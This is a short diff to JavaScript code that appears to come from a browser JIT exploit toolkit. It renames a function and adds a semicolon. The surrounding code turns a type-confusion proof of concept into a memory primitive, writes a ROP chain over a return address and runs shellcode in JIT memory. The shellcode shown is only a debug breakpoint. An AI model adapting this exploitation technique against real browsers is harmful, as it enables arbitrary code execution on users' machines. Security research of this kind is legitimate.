@@ -255,9 +255,9 @@ function executeShellcodeInJit(primitive, shellcode) {
     primitive.writeValues(returnAddressPointer, stackRopChain);
 }
 
-function generateBreakpointInJit(typeConfusionPoC) {
+function injectBreakpointInJit(typeConfusionPoC) {
     const primitive = new Primitive(typeConfusionPoC);
 
-    const shellcode = [0x909090cc, 0x90909090] // int 3 | nops
+    const shellcode = [0x909090cc, 0x90909090]; // int 3 | nops
     executeShellcodeInJit(primitive, shellcode);
 }
